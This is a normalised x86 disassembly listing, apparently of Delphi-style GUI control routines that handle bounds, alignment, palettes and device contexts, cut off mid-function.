mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_447981
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_447b34
call sub_403bc8
call sub_403bc8
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4188a0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_425008
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_4479b4
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418c64
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_447a52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447a59
mov eax [ rw-data ]
call sub_418cc8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_447a2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_447b34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425064
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4188a0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_425008
test al al
je r-xdata
sub_447a60
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_447b34
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424bb8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_447a8c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4251e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4251ec
mov eax [ ebp - 0x4 ]
call sub_447b80
mov eax [ rw-data ]
call sub_418c64
mov ebx eax
xor eax eax
push ebp
push sub_447b11
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_418744
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418cc8
retn
call sub_4478f8
sub_447b34
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4251ec
mov edx ebx
mov eax [ rw-data ]
call sub_418c78
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_447b80
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_449610
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_447bac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403338
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_447be8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418f98
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_447c30
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_447cec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_447db9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447dc0
lea eax [ ebp - 0x1c ]
call sub_404164
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403564
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_45849c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409098
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4041b8
sub_447ddc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_447e43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_455568
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_448fb4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov edx [ eax + 0x64 ]
pop eax
call sub_404570
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447e4a
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov al 0x1
sub_447e50
push ebx
mov ebx eax
mov eax ebx
call sub_455590
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_447e84
push ebx
mov ebx eax
mov eax ebx
call sub_4555e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404570
je r-xdata
mov al 0x1
pop ebx
retn
sub_447ebc
push ebx
mov ebx eax
mov eax ebx
call sub_45561c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_447ef0
push ebx
mov ebx eax
mov eax ebx
call sub_421a74
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_447f18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_448fe4
sub_447f38
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_447f58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_4041b8
sub_447f7c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_448ed4
sub_447f9c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_447fc8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404570
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_44802c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_448908
sub_44804c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4488f4
sub_44806c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_44808c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421184
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424004
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_449064
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_447bac
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_449f40
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_448164
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_40371c
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46793c
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403704
push edi
xor ecx ecx
mov edx 0xb039
call sub_44a180
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_448954
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403564
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403368
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403368
mov eax [ edi + 0x68 ]
call sub_403368
mov eax [ edi + 0x64 ]
call sub_408c08
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4211d0
test bl bl
jle r-xdata
sub_448230
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_448258
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403564
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4482e0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_4485e0
sub_448300
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403368
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44af9c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403564
mov edx ebx
mov eax edi
call sub_421254
mov eax ebx
mov si 0xffd9
call sub_403564
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_4483c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4215e4
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44a180
sub_44845c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4214a0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_448f6c
jmp r-xdata
xor edx edx
mov eax esi
call sub_448300
sub_4484a0
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403564
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_4482e0
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403564
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_448548
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_44a710
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4493fc
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4485e0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_44a180
mov eax ebx
mov si 0xffd0
call sub_403564
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403564
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_4485e0
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_4486fc
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_448720
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_448748
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_44876c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_448790
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_44888b
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403564
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448892
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418a3c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403564
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403564
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418744
sub_44889c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4493fc
mov edx edi
mov eax ebx
call sub_448974
mov edx edi
mov eax ebx
call sub_44a224
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_448908
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_4041b8
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_44892c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_448954
mov ecx esp
mov edx esi
mov eax ebx
mov si 0xffcc
call sub_403564
add esp 0x10
pop esi
pop ebx
retn
sub_448974
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4489d0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4489fc
mov edx eax
mov ecx esp
mov eax esi
call sub_41723c
mov edx esp
mov eax ebx
call sub_448e40
pop ecx
pop edx
pop esi
pop ebx
retn
sub_448a14
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4489b8
mov ecx esp
mov edx esi
call sub_41723c
mov edx esp
mov eax ebx
call sub_448e40
pop ecx
pop edx
pop esi
pop ebx
retn
sub_448a3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_448abd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448ac4
lea eax [ ebp - 0xc ]
call sub_404164
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
sub_448acc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
